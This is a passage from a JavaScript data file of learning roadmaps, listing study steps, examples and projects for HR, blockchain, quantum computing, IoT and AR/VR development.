                            { id: "hr-13", title: "Payroll Fundamentals", description: "Payroll processing, taxes, benefits deductions.", example: "Gross pay → FIT/SIT/FICA → benefits deductions → net pay. ADP, Gusto." },
                            { id: "hr-14", title: "Employee Engagement", description: "Pulse surveys, recognition programs, eNPS.", example: "Gallup Q12 survey; eNPS = % promoters - % detractors; < 0 = problem." },
                            { id: "hr-15", title: "Offboarding", description: "Managing exits gracefully and compliantly.", example: "Exit interview; knowledge transfer; COBRA notification; access revocation checklist." },
                            { id: "hr-16", title: "Workforce Planning", description: "Forecasting headcount needs.", example: "Growth model: if product grows 50%, need 15 more engineers in 2 quarters." },
                            { id: "hr-17", title: "HR Analytics", description: "Using data to improve HR decisions.", example: "Attrition rate; time-to-hire; cost-per-hire; diversity pipeline metrics." },
                            { id: "hr-18", title: "Culture Building", description: "Defining and embedding organizational values.", example: "Culture doc (Netlfix Culture Deck); values in hiring, performance, promotions." },
                            { id: "hr-19", title: "Remote Work Policies", description: "Policy design for distributed teams.", example: "Async-first norms; home office stipend; overlap hours policy; equipment provision." },
                            { id: "hr-20", title: "PHR / SHRM-CP Certification", description: "Professional HR certifications.", example: "SHRM-CP: 500 hours of HR experience + exam; PHR from HRCI." }
                        ]
                    }
                ],
                project: "Design a full hiring process for a software engineer role: JD, interview scorecard, offer template, and 90-day onboarding plan."
            }
        ]
    },
    blockchain: {
        title: "Blockchain Development Roadmap",
        stages: [
            {
                title: "Blockchain Fundamentals & Smart Contracts",
                modules: [
                    {
                        id: "bc-1", title: "Blockchain & Smart Contract Development",
                        steps: [
                            { id: "bc-1", title: "How Blockchain Works", description: "Distributed ledger, blocks, chains, cryptographic hashes.", example: "Block = {data, previous_hash, hash = SHA256(data + previous_hash)}." },
                            { id: "bc-2", title: "Consensus Mechanisms", description: "Proof of Work, Proof of Stake, DPoS, BFT.", example: "Bitcoin PoW: miners compete to solve hash puzzle; Ethereum PoS: validators stake ETH." },
                            { id: "bc-3", title: "Public vs Private Blockchains", description: "Permissionless vs permissioned networks.", example: "Ethereum: public; Hyperledger Fabric: enterprise private blockchain." },
                            { id: "bc-4", title: "Wallets & Cryptography", description: "Public/private keys, digital signatures, seed phrases.", example: "Wallet = keypair; TX signed with private key; verified with public key." },
                            { id: "bc-5", title: "Ethereum Architecture", description: "EVM, gas, accounts, transactions, nodes.", example: "EOA sends TX → EVM executes → state changes → gas paid to validator." },
                            { id: "bc-6", title: "Solidity Basics", description: "Ethereum's smart contract programming language.", example: "pragma solidity ^0.8.0; contract Token { mapping(address=>uint256) balances; }" },
                            { id: "bc-7", title: "Smart Contract Data Types", description: "uint, address, mapping, struct, array, bytes.", example: "mapping(address => uint256) public balances; struct User { string name; uint age; }" },
                            { id: "bc-8", title: "ERC-20 Token Standard", description: "Fungible token interface.", example: "transfer(), balanceOf(), approve(), allowance(), totalSupply()." },
                            { id: "bc-9", title: "ERC-721 NFT Standard", description: "Non-fungible token standard.", example: "ownerOf(tokenId); tokenURI(tokenId) returns metadata URL." },
                            { id: "bc-10", title: "Hardhat Development Environment", description: "Local blockchain, testing, deployment.", example: "npx hardhat node; npx hardhat compile; npx hardhat test; npx hardhat run scripts/deploy.js" },
                            { id: "bc-11", title: "Smart Contract Testing", description: "Unit testing with Mocha/Chai/Ethers.js.", example: "expect(await token.balanceOf(owner.address)).to.equal(1000);" },
                            { id: "bc-12", title: "Security & Vulnerabilities", description: "Reentrancy, overflow, front-running, access control.", example: "Reentrancy: update state BEFORE external call; use ReentrancyGuard." },
                            { id: "bc-13", title: "OpenZeppelin Contracts", description: "Audited contract libraries.", example: "import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract MyToken is ERC20" },
                            { id: "bc-14", title: "Deploying to Testnets", description: "Sepolia, Goerli — testing before mainnet.", example: "Configure hardhat with Sepolia RPC; use faucet for test ETH; deploy; verify on Etherscan." },
                            { id: "bc-15", title: "DeFi Protocols", description: "Uniswap, Aave, Compound — how they work.", example: "Uniswap AMM: x * y = k; swap ETH for USDC at automated price." },
                            { id: "bc-16", title: "Web3.js / Ethers.js", description: "Connecting frontend to blockchain.", example: "const provider = new ethers.BrowserProvider(window.ethereum); await provider.send('eth_requestAccounts', []);" },
                            { id: "bc-17", title: "IPFS for Decentralized Storage", description: "Storing NFT metadata and files off-chain.", example: "ipfs add image.png → CID → store in tokenURI for NFT metadata." },
                            { id: "bc-18", title: "Layer 2 Solutions", description: "Polygon, Optimism, Arbitrum for scalability.", example: "Polygon PoS sidechain; Optimism: optimistic rollups — batch TXs, cheap gas." },
                            { id: "bc-19", title: "DAOs", description: "Decentralized autonomous organizations using governance tokens.", example: "Snapshot for off-chain voting; Governor contract for on-chain execution." },
                            { id: "bc-20", title: "Smart Contract Audit Basics", description: "Reading audit reports, common findings.", example: "Trail of Bits, Consensys Diligence; check Slither static analysis tool." }
                        ]
                    }
                ],
                project: "Deploy a full ERC-20 token with staking contract on Sepolia testnet, with a React + Ethers.js frontend to interact with it."
            }
        ]
    },
    quantumcomputing: {
        title: "Quantum Computing Roadmap",
        stages: [
            {
                title: "Quantum Theory & Programming",
                modules: [
                    {
                        id: "qc-1", title: "Quantum Computing Fundamentals",
                        steps: [
                            { id: "qc-1", title: "Classical vs Quantum Computing", description: "Bits vs qubits; exponential parallelism.", example: "3 classical bits: 8 states sequentially; 3 qubits: 8 states simultaneously." },
                            { id: "qc-2", title: "Superposition", description: "A qubit can be 0, 1, or both simultaneously until measured.", example: "|ψ⟩ = α|0⟩ + β|1⟩; probability |α|²+|β|²=1." },
                            { id: "qc-3", title: "Entanglement", description: "Two qubits correlated regardless of distance.", example: "Bell state: |Φ+⟩ = (|00⟩ + |11⟩)/√2; measure one → instantly know other." },
                            { id: "qc-4", title: "Quantum Interference", description: "Amplifying correct and canceling wrong paths.", example: "Grover's algorithm uses interference to find answer in √N steps." },
                            { id: "qc-5", title: "Quantum Gates", description: "Hadamard, Pauli-X/Y/Z, CNOT, Toffoli gates.", example: "H gate: |0⟩ → (|0⟩+|1⟩)/√2; X gate: |0⟩ → |1⟩ (quantum NOT)." },
                            { id: "qc-6", title: "Quantum Circuits", description: "Composing gates into algorithms.", example: "H → CNOT → measure; creates Bell state from |00⟩." },
                            { id: "qc-7", title: "Qiskit (IBM Quantum SDK)", description: "Python SDK for building and running quantum circuits.", example: "from qiskit import QuantumCircuit; qc = QuantumCircuit(2,2); qc.h(0); qc.cx(0,1)" },
                            { id: "qc-8", title: "Running on Real Hardware", description: "IBM Quantum Experience, IBMQ cloud access.", example: "from qiskit_ibm_runtime import QiskitRuntimeService; backend = service.least_busy()" },
                            { id: "qc-9", title: "Quantum Error & Noise", description: "Decoherence, gate error, readout error.", example: "T1 (relaxation time), T2 (dephasing time); error mitigation techniques." },
                            { id: "qc-10", title: "Grover's Algorithm", description: "Quantum search in O(√N) vs classical O(N).", example: "Find item in unsorted database of 1M: classical 500K; quantum ~1000 steps." },
                            { id: "qc-11", title: "Shor's Algorithm", description: "Polynomial-time factoring of large integers.", example: "Factors 2048-bit RSA key in polynomial time — threat to current cryptography." },
                            { id: "qc-12", title: "QAOA (Quantum Approximate Optimization)", description: "Solving combinatorial optimization problems.", example: "Traveling salesman; portfolio optimization; graph coloring." },
                            { id: "qc-13", title: "VQE (Variational Quantum Eigensolver)", description: "Quantum-classical hybrid for chemistry simulations.", example: "Simulate molecular energy levels for drug discovery." },
                            { id: "qc-14", title: "Quantum Cryptography (QKD)", description: "Quantum key distribution — theoretically unhackable.", example: "BB84 protocol: photon polarization for secure key exchange." },
                            { id: "qc-15", title: "Linear Algebra for Quantum", description: "Vectors, matrices, eigenvalues, unitary matrices.", example: "Quantum state = vector; gate = matrix; gate applied = matrix × vector." },
                            { id: "qc-16", title: "PennyLane for ML", description: "Quantum machine learning framework.", example: "qml.qnode(dev)(circuit); hybrid classical-quantum neural network." },
                            { id: "qc-17", title: "Amazon Braket", description: "AWS quantum computing service.", example: "Access IonQ, Rigetti, D-Wave via Amazon Braket; pay per task/shot." },
                            { id: "qc-18", title: "Google Cirq", description: "Google's quantum circuit framework.", example: "cirq.Circuit([cirq.H(q), cirq.CNOT(q, q2), cirq.measure(q, q2)])" },
                            { id: "qc-19", title: "Quantum Advantage", description: "Problems where quantum beats classical.", example: "Current NISQ era: quantum volume 128; fault-tolerant still years away." },
                            { id: "qc-20", title: "Quantum Computing Careers", description: "Roles: quantum software engineer, physicist, researcher.", example: "IBM, Google, IonQ, Quantinuum, D-Wave hiring; PhD preferred for research." }
                        ]
                    }
                ],
                project: "Implement Grover's search algorithm in Qiskit, run on simulator and IBM Quantum hardware, and document the speedup vs classical."
            }
        ]
    },
    iot: {
        title: "IoT Development Roadmap",
        stages: [
            {
                title: "IoT Hardware, Connectivity & Cloud",
                modules: [
                    {
                        id: "iot-1", title: "IoT Development Fundamentals",
                        steps: [
                            { id: "iot-1", title: "IoT Architecture Overview", description: "Perception → Network → Processing → Application layers.", example: "Sensor → ESP32 → WiFi → MQTT broker (cloud) → dashboard." },
                            { id: "iot-2", title: "Microcontrollers (Arduino/ESP32)", description: "Programming embedded MCUs.", example: "Arduino IDE: setup() runs once; loop() runs forever; digitalRead(); analogRead()." },
                            { id: "iot-3", title: "Raspberry Pi (Linux SBC)", description: "Full Linux computer for IoT gateway, ML at edge.", example: "Raspberry Pi OS; Python GPIOzero; runs Node-RED, Docker, MQTT broker." },
                            { id: "iot-4", title: "Sensors & Actuators", description: "Temperature, humidity, motion, gas, light sensors.", example: "DHT22 for temp/humidity; PIR for motion; relay module to control AC devices." },
                            { id: "iot-5", title: "Digital & Analog I/O", description: "GPIO digital pins, ADC, PWM.", example: "GPIO.digitalRead(pin); analogRead (0-4095 on ESP32 12-bit ADC); PWM for motor speed." },
                            { id: "iot-6", title: "Communication Protocols", description: "I2C, SPI, UART for device communication.", example: "I2C: 2 wires (SDA, SCL); address-based; used for OLED displays, sensors." },
                            { id: "iot-7", title: "Wireless Connectivity", description: "WiFi, Bluetooth BLE, Zigbee, LoRaWAN, NB-IoT.", example: "WiFi for home; LoRa for long range (city farm sensors); BLE for wearables." },
                            { id: "iot-8", title: "MQTT Protocol", description: "Lightweight publish/subscribe messaging for IoT.", example: "client.publish('home/temp', '23.5'); client.subscribe('home/+'); broker: Mosquitto." },
                            { id: "iot-9", title: "CoAP Protocol", description: "Constrained Application Protocol for very limited devices.", example: "RESTful like HTTP but UDP-based, binary, low overhead." },
                            { id: "iot-10", title: "AWS IoT Core", description: "Managing device connections, rules, and data routing.", example: "Device → X.509 cert → AWS IoT Core → rules engine → DynamoDB/Lambda/S3." },
                            { id: "iot-11", title: "Azure IoT Hub", description: "Microsoft's IoT cloud platform.", example: "Device provisioning service; device twin for state sync; Stream Analytics." },
                            { id: "iot-12", title: "Edge Computing", description: "Processing data at the device instead of the cloud.", example: "AWS Greengrass runs Lambda at edge; reduces latency and bandwidth." },
                            { id: "iot-13", title: "Node-RED", description: "Visual flow-based programming for IoT.", example: "MQTT input → function node → dashboard chart; drag-and-drop flows." },
                            { id: "iot-14", title: "Time-Series Databases", description: "InfluxDB, TimescaleDB for IoT sensor data.", example: "InfluxDB: measurement, tags, fields, timestamp; Grafana for visualization." },
                            { id: "iot-15", title: "IoT Security", description: "Device authentication, encrypted comms, OTA updates.", example: "TLS for MQTT; X.509 certs; disable unused ports; regular firmware updates." },
                            { id: "iot-16", title: "OTA (Over-the-Air) Updates", description: "Pushing firmware updates remotely.", example: "ESP32: ArduinoOTA; AWS IoT: Job service for fleet-wide firmware rollout." },
                            { id: "iot-17", title: "Machine Learning at the Edge (TinyML)", description: "Running ML models on microcontrollers.", example: "TensorFlow Lite Micro; gesture recognition on Arduino Nano 33 BLE." },
                            { id: "iot-18", title: "Smart Home Protocols", description: "Matter, Z-Wave, KNX, Home Assistant.", example: "Home Assistant: integrates 1000+ devices; Matter standard for interoperability." },
                            { id: "iot-19", title: "Industrial IoT (IIoT)", description: "OPC-UA, Modbus for industrial machines.", example: "PLC → Modbus RTU → gateway → MQTT → cloud platform (Ignition, Grafana)." },
                            { id: "iot-20", title: "IoT Project Management", description: "Prototyping, PCB design, manufacturing for scale.", example: "Prototype: breadboard; MVP: perfboard/PCB; production: Seeed Fusion PCB order." }
                        ]
                    }
                ],
                project: "Build a smart home monitor: ESP32 + DHT22 + PIR sensor → MQTT → AWS IoT Core → Grafana dashboard with email alerts."
            }
        ]
    },
    arvr: {
        title: "AR/VR Development Roadmap",
        stages: [
            {
                title: "Immersive Technology Development",
                modules: [
                    {
                        id: "arvr-1", title: "AR/VR Development Fundamentals",
                        steps: [
                            { id: "arvr-1", title: "AR vs VR vs MR", description: "Augmented Reality, Virtual Reality, Mixed Reality distinctions.", example: "AR: Pokémon GO (phone overlay); VR: Meta Quest (fully immersive); MR: HoloLens." },
                            { id: "arvr-2", title: "Unity 3D Basics", description: "Game engine for AR/VR development.", example: "GameObjects, Components, Transform, Rigidbody, Collider — Unity fundamentals." },
                            { id: "arvr-3", title: "C# for Unity", description: "Scripting components and game logic.", example: "public class PlayerMove : MonoBehaviour { void Update() { float h = Input.GetAxis('Horizontal'); transform.Translate(h * speed * Time.deltaTime, 0, 0); } }" },
                            { id: "arvr-4", title: "Unity XR Toolkit", description: "Unity's framework for building AR/VR apps.", example: "XR Rig: camera + controllers; XR Interactable for grabbable objects." },
                            { id: "arvr-5", title: "Meta Quest Development", description: "VR development for Oculus/Meta headsets.", example: "Meta XR SDK; OpenXR standard; hand tracking; guardian boundary." },
                            { id: "arvr-6", title: "HTC Vive / SteamVR", description: "PC VR development with room-scale tracking.", example: "SteamVR SDK; Valve Index 6DOF controllers; lighthouse base stations." },
                            { id: "arvr-7", title: "ARCore (Android)", description: "Google's AR platform for Android.", example: "Plane detection; anchor placement; image tracking; light estimation." },
                            { id: "arvr-8", title: "ARKit (iOS)", description: "Apple's AR platform for iOS.", example: "ARPlaneAnchor; RealityKit; LiDAR for precise room scanning on iPad Pro." },
                            { id: "arvr-9", title: "Vuforia (Marker-based AR)", description: "Image and object target tracking.", example: "Create target image → Vuforia DB → detect marker → overlay 3D model." },
                            { id: "arvr-10", title: "WebXR (Browser AR/VR)", description: "Immersive experiences in the browser.", example: "A-Frame: <a-scene><a-box position='0 1.5 -5' rotation='0 45 0' color='#4CC3D9'></a-box></a-scene>" },
                            { id: "arvr-11", title: "3D Asset Pipeline", description: "Creating/importing models, textures, animations.", example: "Blender → GLTF export → Unity import → add XR interactions." },
                            { id: "arvr-12", title: "Spatial UI Design", description: "Designing interfaces for 3D space.", example: "Avoid screen-space UI in VR; use world-space canvas; 1-2m comfortable viewing distance." },
                            { id: "arvr-13", title: "Hand Tracking", description: "Natural hand interactions without controllers.", example: "Meta Hand Tracking SDK; pinch to select; grip to grab; index point to interact." },
                            { id: "arvr-14", title: "Haptics & Sensory Feedback", description: "Vibration motors for touch feedback in VR.", example: "OVRInput.SetControllerVibration(0.5f, 0.5f, OVRInput.Controller.RTouch);" },
                            { id: "arvr-15", title: "Locomotion in VR (Comfort)", description: "Teleportation, smooth, snap-turn for motion sickness.", example: "Teleport for comfort; smooth locomotion with snap turn for experienced users." },
                            { id: "arvr-16", title: "Multiplayer VR / AR", description: "Shared virtual spaces with networking.", example: "Photon Unity Networking for VR multiplayer; sync positions via RPCs." },
                            { id: "arvr-17", title: "Unreal Engine for VR", description: "Industry standard for high-fidelity VR.", example: "Lumen global illumination; Nanite virtualized meshes; VR Preview in editor." },
                            { id: "arvr-18", title: "Apple Vision Pro (visionOS)", description: "Spatial computing development.", example: "SwiftUI + RealityKit; EyeInput for gaze; TapGesture for selection." },
                            { id: "arvr-19", title: "Performance Optimization for XR", description: "Maintaining 72-120fps for comfort.", example: "Oculus Performance HUD; Fixed Foveated Rendering; Texture compression; LOD groups." },
                            { id: "arvr-20", title: "XR Publishing & Distribution", description: "Meta Quest Store, SteamVR, App Lab, TestFlight.", example: "Meta store review takes 2-4 weeks; App Lab for beta; WebXR on any browser." }
                        ]
                    }
                ],
                project: "Build an AR app (ARCore/ARKit) that detects flat surfaces and lets users place and interact with 3D objects in real space."
            }
        ]
    }
};
